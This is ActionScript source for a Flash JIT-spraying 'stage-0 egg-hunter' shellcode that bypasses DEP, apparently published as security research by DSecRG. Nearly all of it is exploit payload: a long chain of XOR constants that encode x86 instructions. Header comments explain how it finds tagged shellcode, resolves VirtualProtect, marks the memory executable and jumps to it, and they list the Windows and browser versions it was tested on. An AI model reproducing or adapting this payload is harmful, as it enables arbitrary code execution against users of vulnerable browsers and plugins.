// JITed egg-hunter stage-0 shellcode
//      (Permanent DEP bypass)
//
//      By Alexey Sintsov
// dookie@inbox.ru
// a.sintsov@dsec.ru
//
// DSecRG - Digital Security Research Group [dsecrg.com]//
//
//      TAG=3135330731353307
//                  its mean 0x07333531 twice!
//
//
//      This version is more universal than old STAGE-0 (that have use Flash Dictionary addr leakage)
//
//
//      Example of usage and tools for modify:  http://www.dsecrg.com/files/pub/tools/JIT.zip
//
//      Find shellcode by TAG          - need time ))
//      Find VirtualProtect address
//      Mark shellcode mem as executable
//      Jump on it...
//
//
//      Tested on Windows XP SP3/SP2, Windows 7: IE8, FF3.6
//
//      For Win7 make differ from comments
//      it's needed cos used skape (mmiller@hick.org) shellcode (NtDisplayString)
//
//

package {
    import flash.display.*
 public class Loadzz2 extends MovieClip
    {
  function funcXOR1()
  {
   var jit=(0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^
   0x3c58d231^
   0x3cffca80^
   0x3c0fce80^
   0x3c429090^
   0x3c436a52^ //0x3c6d6a52 for Win7
   0x3c2ecd58^
   0x6a90053c^
   0x6a905a5a^
   0x3c90d874^
   0x31b85959^
   0x3c900733^
   0x6aaffa8b^
   0x6aafd175^
   0x6a595990^
   0x3c57c775^
   0x3c44ec83^
   0x3c90C033^
   0x3c9030b0^
   0x3c008b64^
   0x3c0c408b^
   0x3c1c408b^
   0x3c08508b^
   0x3c20788b^
   0x3c90008b^
   0x6a6b3f80^
   0x3c90eA75^
   0x3c904747^
   0x6a653f80^
   0x3c90ef75^
   0x3c904747^
   0x6a723f80^
   0x3c90ef75^
   0x3c904747^
   0x6a6e3f80^
   0x3c90ef75^
   0x3c529090^
   0x3c3cc283^
   0x3c903a8b^
   0x3c24148b^
   0x3c90d703^
   0x3c78c283^
   0x3c903a8b^
   0x3c24148b^
   0x3c90d703^
   0x3c18c283^
   0x3c903a8b^
   0x3c04c283^
   0x3c901a8b^
   0x3c241c03^
   0x3c04c283^
   0x3c90328b^
   0x3c243403^
   0x3c04c283^
   0x3c900a8b^
   0x3c240c03^
   0x3cb89090^
   0x3c900000^
   0x3c9063b0^
   0x3c5074b4^
   0x3cb89090^
   0x3c906574^
   0x3c9072b0^
   0x3c506fb4^
   0x3cb89090^
   0x3c90506c^
   0x3c9075b0^
   0x3c5061b4^
   0x3cb89090^
   0x3c907472^
   0x3c9056b0^
   0x3c5069b4^
   0x3c90d78b^
   0x3c90C033^
   0x3c90ff33^
   0x3c535156^
   0x3c909090^
   0x3c909090^
   0x3c574790^
   0x3c24048b^
   0x3c02e0c1^
   0x3c90f003^
   0x3c90068b^
   0x3c20c483^
   0x3c240403^
   0x3c20ec83^
   0x3c90c933^
   0x3c900eb1^
   0x3c10c483^
   0x3c90f48b^
   0x3c90f88b^
   0x3c18c483^
   0x6a90a6f3^
   0x14901474^
   0x3c24ec83^
   0x3c595b5f^
   0x3c90905e^
   0x3c9090eb^
   0x3c24ec83^
   0x3c595b5f^
   0x3c90905e^
   0x3c90e7d1^
   0x3c90cf03^
   0x3c90c033^
   0x3c018b66^
   0x3c02e0c1^
   0x3c90c303^
   0x3c90188b^
   0x3c10c483^
   0x3c241c03^
   0x3c5cc483^ // for Win7 0x3c60c483
   0x3c90905F^
   0x3c406a54^
   0x3c90016a^
   0x3cd3ff57^
   0x3c90e7ff^
   0x3ccccccc);
   return jit;
  }

  function Loadzz2()
  {
    var ret1=funcXOR1();
  }
    }
}